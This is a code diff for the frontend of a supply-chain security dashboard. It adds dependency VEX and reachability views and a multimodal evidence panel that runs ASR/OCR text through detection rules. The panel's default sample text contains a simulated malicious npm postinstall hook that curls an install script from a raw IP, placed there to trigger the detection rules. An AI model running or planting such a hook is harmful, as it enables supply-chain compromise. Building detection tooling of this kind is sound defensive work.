@@ -35,12 +35,14 @@ import {
   FileSearch,
   FileText,
   Fingerprint,
+  Images,
   GitBranch,
   GitCommitHorizontal,
   GitPullRequestArrow,
   KeyRound,
   Loader2,
   MessageSquare,
+  Music2,
   Network,
   PackageCheck,
   Radar,
@@ -56,9 +58,11 @@ import {
   TrendingUp,
   Upload,
   User,
+  Video,
 } from 'lucide-react'
 import { toast } from 'sonner'
 import {
+  analyzeMultimodalRecognizedText,
   askSecurityAssistant,
   createCICDAuditBaseline,
   createCodeAuditBaseline,
@@ -69,10 +73,12 @@ import {
   ingestRealtimeLogs,
   loadCICDAuditSarif,
   loadDependencyAuditSbom,
+  loadDependencyAuditVex,
   loadArtifactTrustReport,
   loadCodeAuditSarif,
   loadGitHubCodeScanningUploadStatus,
   loadCodeAuditState,
+  loadMultimodalEvidenceLatest,
   loadRealtimeLogEvents,
   loadRealtimeLogTrend,
   loadSecurityWorkspace,
@@ -81,6 +87,7 @@ import {
   runDependencyAuditScan,
   runCodeAuditScan,
   runLogAuditScan,
+  runMultimodalEvidenceScan,
   uploadArtifactTrustScan,
   type ArtifactTrustResult,
   uploadCodeAuditToGitHubCodeScanning,
@@ -93,6 +100,9 @@ import {
   type GitHubCodeScanningUploadResult,
   type LogAuditResult,
   type LogAuditSource,
+  type MultimodalAuditResult,
+  type MultimodalEvidence,
+  type MultimodalSourceType,
   type RealtimeLogPayload,
   type RealtimeLogTrendPoint,
   type SecurityAssistantPayload,
@@ -103,6 +113,7 @@ import {
   type SecurityPipelineStep,
   type SecuritySeverity,
   type SecurityWorkspace,
+  type VexStatus,
 } from '@/lib/security-api'
 import { IconGithub } from '@/assets/brand-icons'
 import { cn } from '@/lib/utils'
@@ -163,15 +174,23 @@ const platformTabs = [
   'pipeline',
   'artifact',
   'logs',
+  'multimodal',
   'graph',
   'copilot',
   'report',
 ] as const
 
 type PlatformTab = (typeof platformTabs)[number]
+type KnowledgeGraphNode = NonNullable<
+  NonNullable<SecurityWorkspace['graph']>['nodes']
+>[number]
+type KnowledgeGraphEdge = NonNullable<
+  NonNullable<SecurityWorkspace['graph']>['edges']
+>[number]
 type KnowledgeGraphAttackPath = NonNullable<
   NonNullable<SecurityWorkspace['graph']>['attack_paths']
 >[number]
+type GraphDisplayMode = 'attack' | 'trust' | 'all'
 
 const severityLabels: Record<SecuritySeverity, string> = {
   critical: '严重',
@@ -212,6 +231,29 @@ const graphPositions: Record<string, { x: number; y: number }> = {
   log: { x: 230, y: 330 },
   apt: { x: 0, y: 330 },
 }
+
+const graphNodeTypeOrder = [
+  'CodeFile',
+  'DependencyPackage',
+  'Vulnerability',
+  'CIStep',
+  'BuildArtifact',
+  'SourceCommit',
+  'Workflow',
+  'TrustedBuilder',
+  'Attestation',
+  'RuntimeService',
+  'LogEvent',
+  'AudioEvidence',
+  'VisualEvidence',
+  'MultimodalEvidence',
+  'MultimodalFinding',
+  'RecognizedEntity',
+  'Finding',
+  'AttackStage',
+  'EvidenceChain',
+  'Asset',
+]
 
 const fallbackQuestion = '这条供应链攻击链路应该优先修哪里？'
 const fallbackAssistant: SecurityAssistantPayload = {
@@ -371,6 +413,7 @@ export function SecurityPlatform() {
               <TabsTrigger value='pipeline'>CI/CD 链路</TabsTrigger>
               <TabsTrigger value='artifact'>产物可信</TabsTrigger>
               <TabsTrigger value='logs'>日志识别</TabsTrigger>
+              <TabsTrigger value='multimodal'>多模态证据</TabsTrigger>
               <TabsTrigger value='graph'>知识图谱</TabsTrigger>
               <TabsTrigger value='copilot'>安全 Copilot</TabsTrigger>
               <TabsTrigger value='report'>安全分析报告</TabsTrigger>
@@ -428,7 +471,7 @@ export function SecurityPlatform() {
                     risk_score: Math.max(workspace.summary.risk_score, audit.summary.risk_score),
                   },
                 })
-                toast.success(`依赖扫描完成，发现 ${audit.summary.total_dependencies} 个直接依赖`)
+                toast.success(`依赖扫描完成，生成 ${audit.summary.vex?.statement_count ?? 0} 条 VEX statement`)
               }}
             />
           </TabsContent>
@@ -471,8 +514,10 @@ export function SecurityPlatform() {
           <TabsContent value='artifact' className='space-y-4'>
             <ArtifactTrustPanel
               result={workspace.artifact_trust}
-              onScanned={(result) => {
+              onScanned={async (result) => {
                 setWorkspace(applyArtifactTrustToWorkspace(workspace, result))
+                const nextWorkspace = await loadSecurityWorkspace()
+                setWorkspace(nextWorkspace)
                 toast.success(`产物可信验证完成，评分 ${artifactTrustScore(result)} / 100`)
               }}
             />
@@ -489,6 +534,18 @@ export function SecurityPlatform() {
               onScanned={(audit) => {
                 setWorkspace(applyLogAuditToWorkspace(workspace, audit))
                 toast.success(`日志扫描完成，发现 ${audit.summary.finding_count} 项运行期风险`)
+              }}
+            />
+          </TabsContent>
+
+          <TabsContent value='multimodal' className='space-y-4'>
+            <MultimodalEvidencePanel
+              result={workspace.multimodal_audit}
+              onScanned={async (result) => {
+                setWorkspace(applyMultimodalAuditToWorkspace(workspace, result))
+                const nextWorkspace = await loadSecurityWorkspace()
+                setWorkspace(nextWorkspace)
+                toast.success(`多模态证据已接入 ${result.summary.evidence_count} 条`)
               }}
             />
           </TabsContent>
@@ -1343,6 +1400,8 @@ function SupplyChainPanel({
     () => Array.from(new Set(dependencies.map((dependency) => dependency.source_file || dependency.manifest_type || 'unknown'))),
     [dependencies]
   )
+  const vexSummary = audit?.summary.vex
+  const reachabilitySummary = audit?.summary.reachability
   const filteredDependencies = useMemo(
     () =>
       dependencies.filter((dependency) => {
@@ -1384,10 +1443,20 @@ function SupplyChainPanel({
   async function downloadSbom() {
     try {
       const sbom = audit?.sbom ?? (await loadDependencyAuditSbom())
-      downloadJson(sbom, 'supplyguard-direct-dependencies.cdx.json')
-      toast.success('CycloneDX SBOM 已导出')
+      downloadJson(sbom, 'supplyguard-sbom-vex.cdx.json')
+      toast.success('CycloneDX SBOM + VEX 已导出')
     } catch (error) {
       toast.error(error instanceof Error ? error.message : 'SBOM 导出失败')
+    }
+  }
+
+  async function downloadVex() {
+    try {
+      const vex = audit?.vex ?? (await loadDependencyAuditVex())
+      downloadJson(vex, 'supplyguard-vex.cdx.json')
+      toast.success('CycloneDX VEX 已导出')
+    } catch (error) {
+      toast.error(error instanceof Error ? error.message : 'VEX 导出失败')
     }
   }
 
@@ -1399,10 +1468,10 @@ function SupplyChainPanel({
             <div>
               <CardTitle className='flex items-center gap-2 text-base'>
                 <PackageCheck className='size-4 text-cyan-600' />
-                SBOM 直接依赖风险评分
+                SBOM + VEX 可达性分析
               </CardTitle>
               <CardDescription>
-                锁文件 / pip freeze 精确版本、传递依赖、CycloneDX SBOM、OSV 结果和风险评分
+                结合依赖 CVE、代码 import/调用、服务暴露面和日志痕迹输出 affected / not_affected / under_investigation / fixed
               </CardDescription>
             </div>
             <div className='flex shrink-0 gap-2'>
@@ -1416,7 +1485,11 @@ function SupplyChainPanel({
               </div>
               <Button variant='outline' size='sm' onClick={() => void downloadSbom()}>
                 <Download />
-                CycloneDX
+                SBOM+VEX
+              </Button>
+              <Button variant='outline' size='sm' onClick={() => void downloadVex()}>
+                <FileSearch />
+                VEX
               </Button>
               <Button size='sm' onClick={() => void startDependencyScan()} disabled={scanning}>
                 {scanning ? <Loader2 className='animate-spin' /> : <RefreshCw />}
@@ -1432,6 +1505,14 @@ function SupplyChainPanel({
               <AuditMetric label='精确版本' value={audit.summary.exact_versions ?? 0} tone='emerald' />
               <AuditMetric label='传递依赖' value={audit.summary.transitive_dependencies ?? 0} tone='slate' />
               <AuditMetric label='OSV 命中' value={audit.summary.osv_matches ?? 0} tone='red' />
+              <AuditMetric label='VEX affected' value={vexSummary?.affected ?? 0} tone='red' />
+              <AuditMetric
+                label='VEX 降噪'
+                value={(vexSummary?.not_affected ?? 0) + (vexSummary?.fixed ?? 0)}
+                tone='emerald'
+              />
+              <AuditMetric label='可达 import' value={reachabilitySummary?.imported_dependencies ?? 0} tone='cyan' />
+              <AuditMetric label='日志痕迹' value={reachabilitySummary?.runtime_trace_dependencies ?? 0} tone='orange' />
             </div>
           ) : (
             <Alert className='rounded-md'>
@@ -1519,6 +1600,7 @@ function SupplyChainPanel({
                 <TableHead>生态</TableHead>
                 <TableHead>来源</TableHead>
                 <TableHead>许可证</TableHead>
+                <TableHead>VEX</TableHead>
                 <TableHead>信号</TableHead>
                 <TableHead className='w-[150px]'>风险</TableHead>
               </TableRow>
@@ -1568,6 +1650,9 @@ function SupplyChainPanel({
                   </TableCell>
                   <TableCell>{dependency.license}</TableCell>
                   <TableCell>
+                    <DependencyVexBadge dependency={dependency} />
+                  </TableCell>
+                  <TableCell>
                     <div className='flex flex-wrap gap-1'>
                       {dependency.signals.slice(0, 3).map((signal) => (
                         <Badge key={signal} variant='outline' className='rounded-md'>
@@ -1587,7 +1672,7 @@ function SupplyChainPanel({
                 </TableRow>
               )) : (
                 <TableRow>
-                  <TableCell colSpan={6} className='h-28 text-center text-sm text-muted-foreground'>
+                  <TableCell colSpan={7} className='h-28 text-center text-sm text-muted-foreground'>
                     暂无符合筛选条件的依赖数据
                   </TableCell>
                 </TableRow>
@@ -1601,9 +1686,9 @@ function SupplyChainPanel({
         <CardHeader>
           <CardTitle className='flex items-center gap-2 text-base'>
             <Boxes className='size-4 text-orange-600' />
-            准入建议
+            VEX 准入建议
           </CardTitle>
-          <CardDescription>按依赖风险和构建影响生成处置动作</CardDescription>
+          <CardDescription>按漏洞可利用性、代码可达性、暴露面和日志证据生成处置动作</CardDescription>
         </CardHeader>
         <CardContent className='space-y-4'>
           {selectedDependency ? (
@@ -1629,6 +1714,7 @@ function SupplyChainPanel({
                 <div>许可证：{selectedDependency.license}</div>
                 <div>类型：{selectedDependency.dependency_type === 'transitive' ? '传递依赖' : '直接依赖'}</div>
               </div>
+              <DependencyVexDetails dependency={selectedDependency} />
             </div>
           ) : null}
           <div className='space-y-3'>
@@ -1665,6 +1751,105 @@ function SupplyChainPanel({
   )
 }
 
+function DependencyVexBadge({ dependency }: { dependency: SecurityDependency }) {
+  const status = dominantVexStatus(dependency)
+  if (!status) {
+    return (
+      <Badge variant='outline' className='rounded-md'>
+        无 CVE
+      </Badge>
+    )
+  }
+  return (
+    <Badge variant='outline' className={cn('rounded-md', vexStatusClass(status))}>
+      {vexStatusLabel(status)}
+    </Badge>
+  )
+}
+
+function DependencyVexDetails({ dependency }: { dependency: SecurityDependency }) {
+  const statements = dependency.vex ?? []
+  const reachability = dependency.reachability
+  const codeEvidence = [...(reachability?.call_evidence ?? []), ...(reachability?.code_evidence ?? [])].slice(0, 3)
+  const attackSurface = reachability?.attack_surface_evidence ?? []
+  const runtimeEvidence = reachability?.runtime_evidence ?? []
+
+  return (
+    <div className='mt-3 space-y-3'>
+      <div className='grid grid-cols-2 gap-2 text-xs'>
+        <ReachabilityFlag label='代码 import' active={Boolean(reachability?.imported)} />
+        <ReachabilityFlag label='调用证据' active={Boolean(reachability?.called)} />
+        <ReachabilityFlag label='服务暴露' active={Boolean(reachability?.attack_surface)} />
+        <ReachabilityFlag label='日志痕迹' active={Boolean(reachability?.runtime_trace)} />
+      </div>
+
+      {statements.length ? (
+        <div className='space-y-2'>
+          <div className='text-xs font-medium text-foreground'>VEX statements</div>
+          {statements.slice(0, 4).map((statement) => (
+            <div key={`${statement.id}-${statement.status}`} className='rounded-md border bg-muted/25 p-2'>
+              <div className='mb-1 flex flex-wrap items-center gap-2'>
+                <Badge variant='outline' className={cn('rounded-md', vexStatusClass(statement.status))}>
+                  {vexStatusLabel(statement.status)}
+                </Badge>
+                <code className='font-mono text-[11px] text-muted-foreground'>{statement.id}</code>
+              </div>
+              <div className='text-xs leading-5 text-muted-foreground'>
+                {statement.detail || statement.cyclonedx_state || '暂无 VEX 说明'}
+              </div>
+            </div>
+          ))}
+        </div>
+      ) : (
+        <div className='rounded-md border border-dashed p-2 text-xs text-muted-foreground'>
+          当前依赖没有漏洞 statement；继续保留 SBOM 组件与许可证证据。
+        </div>
+      )}
+
+      <ReachabilityEvidenceList title='代码证据' items={codeEvidence} />
+      <ReachabilityEvidenceList title='攻击面证据' items={attackSurface} />
+      <ReachabilityEvidenceList title='日志证据' items={runtimeEvidence} />
+    </div>
+  )
+}
+
+function ReachabilityFlag({ label, active }: { label: string; active: boolean }) {
+  return (
+    <div className={cn(
+      'flex items-center justify-between rounded-md border px-2 py-1.5',
+      active ? 'border-emerald-200 bg-emerald-50 text-emerald-700 dark:border-emerald-900 dark:bg-emerald-950/35 dark:text-emerald-300' : 'text-muted-foreground'
+    )}>
+      <span>{label}</span>
+      {active ? <CheckCircle2 className='size-3.5' /> : <EyeOff className='size-3.5' />}
+    </div>
+  )
+}
+
+function ReachabilityEvidenceList({
+  title,
+  items,
+}: {
+  title: string
+  items: NonNullable<SecurityDependency['reachability']>['code_evidence']
+}) {
+  if (!items?.length) return null
+  return (
+    <div className='space-y-1.5'>
+      <div className='text-xs font-medium text-foreground'>{title}</div>
+      {items.slice(0, 3).map((item, index) => (
+        <div key={`${title}-${index}-${item.path ?? item.id ?? item.event}`} className='rounded-md bg-muted/35 px-2 py-1.5 text-[11px] leading-5 text-muted-foreground'>
+          <div className='truncate font-mono'>
+            {item.path ? `${item.path}${item.line ? `:${item.line}` : ''}` : item.rule_id || item.id || item.source || 'evidence'}
+          </div>
+          <div className='line-clamp-2'>
+            {item.snippet || item.evidence || item.event || item.kind || '-'}
+          </div>
+        </div>
+      ))}
+    </div>
+  )
+}
+
 function versionSourceLabel(source: string | undefined) {
   if (source === 'lockfile') return '锁文件'
   if (source === 'environment') return '环境冻结'
@@ -1682,6 +1867,29 @@ function dependencySeverity(risk: number): SecuritySeverity {
   if (risk >= 75) return 'high'
   if (risk >= 60) return 'medium'
   return 'low'
+}
+
+function dominantVexStatus(dependency: SecurityDependency): VexStatus | null {
+  const statuses = (dependency.vex ?? []).map((statement) => statement.status).filter(Boolean)
+  if (!statuses.length) return null
+  if (statuses.includes('affected')) return 'affected'
+  if (statuses.includes('under_investigation')) return 'under_investigation'
+  if (statuses.includes('not_affected')) return 'not_affected'
+  return 'fixed'
+}
+
+function vexStatusLabel(status: VexStatus) {
+  if (status === 'affected') return 'affected'
+  if (status === 'not_affected') return 'not affected'
+  if (status === 'under_investigation') return 'investigate'
+  return 'fixed'
+}
+
+function vexStatusClass(status: VexStatus) {
+  if (status === 'affected') return severityClasses.critical
+  if (status === 'under_investigation') return severityClasses.medium
+  if (status === 'not_affected') return statusClasses.active
+  return severityClasses.low
 }
 
 function PipelinePanel({
@@ -2000,14 +2208,14 @@ function ArtifactTrustPanel({
   onScanned,
 }: {
   result?: ArtifactTrustResult | null
-  onScanned: (result: ArtifactTrustResult) => void
+  onScanned: (result: ArtifactTrustResult) => void | Promise<void>
 }) {
   const [artifactFile, setArtifactFile] = useState<File | null>(null)
   const [attestationFile, setAttestationFile] = useState<File | null>(null)
-  const [expectedRepo, setExpectedRepo] = useState('https://github.com/acme/checkout-service')
-  const [expectedCommit, setExpectedCommit] = useState('8f42c19')
+  const [expectedRepo, setExpectedRepo] = useState('https://github.com/HEIBAI198/Security')
+  const [expectedCommit, setExpectedCommit] = useState('e3e9f7c03ce502642fa9bc9e2c35764c92354c9b')
   const [allowedWorkflows, setAllowedWorkflows] = useState('.github/workflows/release.yml')
-  const [allowedBuilders, setAllowedBuilders] = useState('https://github.com/actions/runner')
+  const [allowedBuilders, setAllowedBuilders] = useState('https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main')
   const [requireSignature, setRequireSignature] = useState(true)
   const [allowSelfHostedRunner, setAllowSelfHostedRunner] = useState(false)
   const [scanning, setScanning] = useState(false)
@@ -2017,9 +2225,9 @@ function ArtifactTrustPanel({
   async function scanSample() {
     setScanning(true)
     try {
-      onScanned(await runArtifactTrustScan({
-        artifactPath: 'storage/samples/artifacts/checkout-api.tar.gz',
-        attestationPath: 'storage/samples/attestations/checkout-api.intoto.jsonl',
+      const result = await runArtifactTrustScan({
+        artifactPath: 'storage/artifact_trust/uploads/test-checkout-api.tar.gz',
+        attestationPath: 'storage/artifact_trust/uploads/test-attestation.jsonl',
         expectedRepo,
         expectedCommit,
         allowedWorkflows: splitPolicyList(allowedWorkflows),
@@ -2028,7 +2236,8 @@ function ArtifactTrustPanel({
         requireProvenance: true,
         allowSelfHostedRunner,
         maxAgeHours: 24,
-      }))
+      })
+      await onScanned(result)
     } catch (error) {
       toast.error(error instanceof Error ? error.message : '产物可信验证失败')
     } finally {
@@ -2043,7 +2252,7 @@ function ArtifactTrustPanel({
     }
     setScanning(true)
     try {
-      onScanned(await uploadArtifactTrustScan({
+      const result = await uploadArtifactTrustScan({
         artifact: artifactFile,
         attestation: attestationFile,
         expectedRepo,
@@ -2054,7 +2263,8 @@ function ArtifactTrustPanel({
         requireProvenance: true,
         allowSelfHostedRunner,
         maxAgeHours: 24,
-      }))
+      })
+      await onScanned(result)
     } catch (error) {
       toast.error(error instanceof Error ? error.message : '上传验证失败')
     } finally {
@@ -2440,6 +2650,34 @@ function applyLogAuditToWorkspace(workspace: SecurityWorkspace, audit: LogAuditR
       open_findings: findings.length,
       critical_findings: findings.filter((finding) => finding.severity === 'critical').length,
       risk_score: Math.max(workspace.summary.risk_score, audit.summary.risk_score),
+    },
+  }
+}
+
+function applyMultimodalAuditToWorkspace(workspace: SecurityWorkspace, result: MultimodalAuditResult): SecurityWorkspace {
+  const evidenceCount = result.summary.evidence_count
+  const findingCount = result.summary.finding_count ?? 0
+  const riskScore = result.summary.risk_score ?? 0
+  const module = {
+    key: 'multimodal',
+    name: '多模态证据接入层',
+    status: findingCount ? result.summary.risk_level : evidenceCount ? 'active' : 'observed',
+    score: Math.max(riskScore, Math.min(92, 58 + evidenceCount * 3 + result.summary.derived_count * 2)),
+    signals: Math.max(evidenceCount, findingCount),
+    description: '上传音频、截图和视频帧，使用 Sigma 风格 YAML 规则抽取实体并生成 Wazuh 风格风险告警。',
+  }
+  const modules = workspace.modules.some((item) => item.key === 'multimodal')
+    ? workspace.modules.map((item) => item.key === 'multimodal' ? module : item)
+    : [...workspace.modules, module]
+
+  return {
+    ...workspace,
+    multimodal_audit: result,
+    modules,
+    summary: {
+      ...workspace.summary,
+      multimodal_evidence: evidenceCount,
+      risk_score: Math.max(workspace.summary.risk_score, riskScore),
     },
   }
 }
@@ -2865,6 +3103,588 @@ function LogsPanel({
   )
 }
 
+function MultimodalEvidencePanel({
+  result,
+  onScanned,
+}: {
+  result?: MultimodalAuditResult | null
+  onScanned: (result: MultimodalAuditResult) => void | Promise<void>
+}) {
+  const [selectedFiles, setSelectedFiles] = useState<File[]>([])
+  const [uploading, setUploading] = useState(false)
+  const [refreshingLatest, setRefreshingLatest] = useState(false)
+  const [recognizedText, setRecognizedText] = useState(
+    'npm install @acme/payments-helper@9.9.2\npostinstall: curl http://185.199.108.153/install.sh\n凌晨三点 checkout-api 出现异常外联，admin/export 接口访问量突然升高。'
+  )
+  const [textSourceType, setTextSourceType] = useState<MultimodalSourceType>('image')
+  const [analyzingText, setAnalyzingText] = useState(false)
+  const evidence = result?.evidence ?? []
+  const summary = result?.summary
+  const warnings = result?.warnings ?? []
+  const textRecognitions = evidence.flatMap((item) =>
+    (item.recognitions ?? []).map((recognition) => ({
+      ...recognition,
+      evidence_id: item.evidence_id,
+      source_name: item.original_filename,
+      }))
+  )
+  const entityRows = evidence.flatMap((item) =>
+    (item.entities ?? []).map((entity) => ({
+      ...entity,
+      evidence_id: item.evidence_id,
+      source_name: item.original_filename,
+      source_type: item.source_type,
+    }))
+  )
+  const findingRows = evidence.flatMap((item) =>
+    (item.findings ?? []).map((finding) => ({
+      ...finding,
+      source_name: item.original_filename,
+      source_type: item.source_type,
+    }))
+  )
+  const derivedArtifacts = evidence.flatMap((item) =>
+    (item.derived ?? []).map((artifact) => ({
+      ...artifact,
+      evidence_id: item.evidence_id,
+      source_name: item.original_filename,
+    }))
+  )
+
+  async function uploadEvidence() {
+    if (!selectedFiles.length) {
+      toast.error('请选择至少一个音频、截图或视频文件')
+      return
+    }
+    setUploading(true)
+    try {
+      await onScanned(await runMultimodalEvidenceScan(selectedFiles))
+      setSelectedFiles([])
+    } catch (error) {
+      toast.error(error instanceof Error ? error.message : '多模态证据上传失败')
+    } finally {
+      setUploading(false)
+    }
+  }
+
+  async function refreshLatest() {
+    setRefreshingLatest(true)
+    try {
+      const payload = await loadMultimodalEvidenceLatest(100)
+      await onScanned(payload)
+      toast.success(`已刷新 ${payload.summary.evidence_count} 条多模态证据`)
+    } catch (error) {
+      toast.error(error instanceof Error ? error.message : '多模态证据刷新失败')
+    } finally {
+      setRefreshingLatest(false)
+    }
+  }
+
+  async function analyzeRecognizedText() {
+    const text = recognizedText.trim()
+    if (!text) {
+      toast.error('请输入 ASR/OCR 识别文本')
+      return
+    }
+    setAnalyzingText(true)
+    try {
+      const payload = await analyzeMultimodalRecognizedText({
+        recognizedText: text,
+        sourceType: textSourceType,
+        evidenceType: textSourceType === 'audio' ? 'audio_asr' : 'visual_ocr',
+        sourceName: textSourceType === 'audio' ? 'manual-asr-alert.txt' : 'manual-ocr-screenshot.txt',
+        confidence: 0.92,
+      })
+      await onScanned(payload)
+      toast.success(`研判完成，抽取 ${payload.summary.entity_count} 个实体，命中 ${payload.summary.finding_count} 条规则`)
+    } catch (error) {
+      toast.error(error instanceof Error ? error.message : '识别文本研判失败')
+    } finally {
+      setAnalyzingText(false)
+    }
+  }
+
+  return (
+    <div className='grid gap-4 xl:grid-cols-[minmax(0,1fr)_360px]'>
+      <div className='space-y-4'>
+        <Card className='rounded-md'>
+          <CardHeader>
+            <div className='flex flex-wrap items-start justify-between gap-3'>
+              <div>
+                <CardTitle className='flex items-center gap-2 text-base'>
+                  <Images className='size-4 text-cyan-600' />
+                  多模态证据接入层
+                </CardTitle>
+                <CardDescription>音频 ASR、截图 OCR 和视频帧 OCR 统一入库为文本证据</CardDescription>
+              </div>
+              <div className='flex flex-wrap items-center gap-2'>
+                <Input
+                  type='file'
+                  multiple
+                  accept='audio/*,image/*,video/*,.aac,.flac,.m4a,.mp3,.ogg,.opus,.wav,.png,.jpg,.jpeg,.webp,.gif,.mp4,.mov,.mkv,.webm,.avi'
+                  className='w-[320px] max-w-full'
+                  onChange={(event) => setSelectedFiles(Array.from(event.target.files ?? []))}
+                />
+                <Button size='sm' variant='outline' onClick={() => void refreshLatest()} disabled={refreshingLatest}>
+                  {refreshingLatest ? <Loader2 className='animate-spin' /> : <RefreshCw />}
+                  刷新
+                </Button>
+                <Button size='sm' onClick={() => void uploadEvidence()} disabled={uploading || !selectedFiles.length}>
+                  {uploading ? <Loader2 className='animate-spin' /> : <Upload />}
+                  上传证据
+                </Button>
+              </div>
+            </div>
+          </CardHeader>
+          <CardContent className='space-y-4'>
+            <div className='grid gap-3 md:grid-cols-6'>
+              <AuditMetric label='证据总数' value={summary?.evidence_count ?? 0} tone='cyan' />
+              <AuditMetric label='音频' value={summary?.audio ?? 0} tone='emerald' />
+              <AuditMetric label='截图/图像' value={summary?.image ?? 0} tone='orange' />
+              <AuditMetric label='视频' value={summary?.video ?? 0} tone='red' />
+              <AuditMetric label='安全实体' value={summary?.entity_count ?? 0} tone='slate' />
+              <AuditMetric label='规则命中' value={summary?.finding_count ?? 0} tone='red' />
+            </div>
+
+            {!evidence.length ? (
+              <Alert className='rounded-md'>
+                <Images className='size-4' />
+                <AlertTitle>等待多模态证据</AlertTitle>
+                <AlertDescription>
+                  上传后会生成 evidence_id、来源类型、文件路径、SHA256 摘要，并尝试输出 ASR/OCR 文本。
+                </AlertDescription>
+              </Alert>
+            ) : null}
+
+            {selectedFiles.length ? (
+              <div className='flex flex-wrap gap-2'>
+                {selectedFiles.map((file) => (
+                  <Badge key={`${file.name}-${file.size}`} variant='outline' className='rounded-md'>
+                    {file.name} · {formatBytes(file.size)}
+                  </Badge>
+                ))}
+              </div>
+            ) : null}
+          </CardContent>
+        </Card>
+
+        <Card className='rounded-md'>
+          <CardHeader>
+            <div className='flex flex-wrap items-start justify-between gap-3'>
+              <div>
+                <CardTitle className='flex items-center gap-2 text-base'>
+                  <Radar className='size-4 text-orange-600' />
+                  安全实体抽取与规则研判
+                </CardTitle>
+                <CardDescription>粘贴 ASR/OCR 文本，按 Sigma 风格 YAML 规则生成 Wazuh 风格告警</CardDescription>
+              </div>
+              <div className='flex items-center gap-2'>
+                <Select value={textSourceType} onValueChange={(value) => setTextSourceType(value as MultimodalSourceType)}>
+                  <SelectTrigger className='h-9 w-[120px] rounded-md'>
+                    <SelectValue />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value='image'>截图 OCR</SelectItem>
+                    <SelectItem value='audio'>音频 ASR</SelectItem>
+                    <SelectItem value='video'>视频帧 OCR</SelectItem>
+                  </SelectContent>
+                </Select>
+                <Button size='sm' onClick={() => void analyzeRecognizedText()} disabled={analyzingText || !recognizedText.trim()}>
+                  {analyzingText ? <Loader2 className='animate-spin' /> : <Radar />}
+                  研判文本
+                </Button>
+              </div>
+            </div>
+          </CardHeader>
+          <CardContent className='space-y-3'>
+            <Textarea
+              value={recognizedText}
+              onChange={(event) => setRecognizedText(event.target.value)}
+              className='min-h-[150px] resize-y rounded-md font-mono text-sm leading-6'
+              placeholder='粘贴 ASR/OCR recognized_text'
+            />
+            <div className='grid gap-3 sm:grid-cols-3'>
+              <AuditMetric label='最高风险' value={summary?.risk_score ?? 0} tone={(summary?.risk_score ?? 0) >= 90 ? 'red' : 'orange'} />
+              <AuditMetric label='严重命中' value={summary?.critical ?? 0} tone='red' />
+              <AuditMetric label='文本证据' value={summary?.recognition_count ?? 0} tone='cyan' />
+            </div>
+          </CardContent>
+        </Card>
+
+        <Card className='rounded-md'>
+          <CardHeader>
+            <CardTitle className='flex items-center gap-2 text-base'>
+              <Fingerprint className='size-4 text-cyan-600' />
+              抽取实体
+            </CardTitle>
+            <CardDescription>IP、域名、CVE、包名、API 路径、服务名、行为关键词和时间</CardDescription>
+          </CardHeader>
+          <CardContent>
+            <Table>
+              <TableHeader>
+                <TableRow>
+                  <TableHead>类型</TableHead>
+                  <TableHead>值</TableHead>
+                  <TableHead>来源</TableHead>
+                  <TableHead>证据片段</TableHead>
+                  <TableHead>置信度</TableHead>
+                </TableRow>
+              </TableHeader>
+              <TableBody>
+                {entityRows.map((entity) => (
+                  <TableRow key={`${entity.evidence_id}-${entity.type}-${entity.normalized}-${entity.start}`}>
+                    <TableCell>
+                      <Badge variant='outline' className={cn('rounded-md', entityBadgeClass(entity.type))}>
+                        {entityTypeLabel(entity.type)}
+                      </Badge>
+                    </TableCell>
+                    <TableCell>
+                      <code className='break-all rounded bg-muted px-2 py-1 text-xs'>{entity.value}</code>
+                    </TableCell>
+                    <TableCell className='min-w-[180px]'>
+                      <div className='text-sm'>{entity.source_name}</div>
+                      <code className='mt-1 block text-xs text-muted-foreground'>{entity.evidence_id}</code>
+                    </TableCell>
+                    <TableCell className='max-w-[520px] text-sm leading-6 text-muted-foreground'>{entity.evidence}</TableCell>
+                    <TableCell className='whitespace-nowrap'>{Math.round((entity.confidence ?? 0) * 100)}%</TableCell>
+                  </TableRow>
+                ))}
+                {!entityRows.length ? (
+                  <TableRow>
+                    <TableCell colSpan={5} className='h-24 text-center text-sm text-muted-foreground'>
+                      暂无实体；上传文件或粘贴 ASR/OCR 文本后会在这里显示抽取结果。
+                    </TableCell>
+                  </TableRow>
+                ) : null}
+              </TableBody>
+            </Table>
+          </CardContent>
+        </Card>
+
+        <Card className='rounded-md'>
+          <CardHeader>
+            <CardTitle className='flex items-center gap-2 text-base'>
+              <ShieldAlert className='size-4 text-red-600' />
+              规则研判
+            </CardTitle>
+            <CardDescription>命中规则、关联实体、风险等级和处置建议</CardDescription>
+          </CardHeader>
+          <CardContent>
+            <Table>
+              <TableHeader>
+                <TableRow>
+                  <TableHead>等级</TableHead>
+                  <TableHead>规则</TableHead>
+                  <TableHead>关联实体</TableHead>
+                  <TableHead>关键词</TableHead>
+                  <TableHead>建议</TableHead>
+                </TableRow>
+              </TableHeader>
+              <TableBody>
+                {findingRows.map((finding) => (
+                  <TableRow key={`${finding.id}-${finding.rule_id}`}>
+                    <TableCell>
+                      <Badge variant='outline' className={cn('rounded-md', severityClasses[finding.severity] ?? severityClasses.medium)}>
+                        {severityLabels[finding.severity] ?? finding.severity} · {finding.score}
+                      </Badge>
+                    </TableCell>
+                    <TableCell className='min-w-[220px]'>
+                      <div className='font-medium'>{finding.title}</div>
+                      <code className='mt-1 block break-all text-xs text-muted-foreground'>{finding.rule_id}</code>
+                    </TableCell>
+                    <TableCell className='max-w-[320px]'>
+                      <div className='flex flex-wrap gap-1.5'>
+                        {(finding.entities ?? []).slice(0, 8).map((entity) => (
+                          <Badge key={`${finding.id}-${entity.type}-${entity.value}`} variant='outline' className='rounded-md'>
+                            {entity.value}
+                          </Badge>
+                        ))}
+                      </div>
+                    </TableCell>
+                    <TableCell className='max-w-[220px] text-sm text-muted-foreground'>
+                      {(finding.matched_keywords ?? []).join(', ') || '-'}
+                    </TableCell>
+                    <TableCell className='max-w-[420px] text-sm leading-6'>{finding.recommendation}</TableCell>
+                  </TableRow>
+                ))}
+                {!findingRows.length ? (
+                  <TableRow>
+                    <TableCell colSpan={5} className='h-24 text-center text-sm text-muted-foreground'>
+                      暂无规则命中；示例文本会触发安装脚本外联和敏感接口异常规则。
+                    </TableCell>
+                  </TableRow>
+                ) : null}
+              </TableBody>
+            </Table>
+          </CardContent>
+        </Card>
+
+        <Card className='rounded-md'>
+          <CardHeader>
+            <CardTitle className='flex items-center gap-2 text-base'>
+              <FileText className='size-4 text-cyan-600' />
+              文本证据
+            </CardTitle>
+            <CardDescription>ASR 和 OCR 输出的 recognized_text、confidence 与 evidence_type</CardDescription>
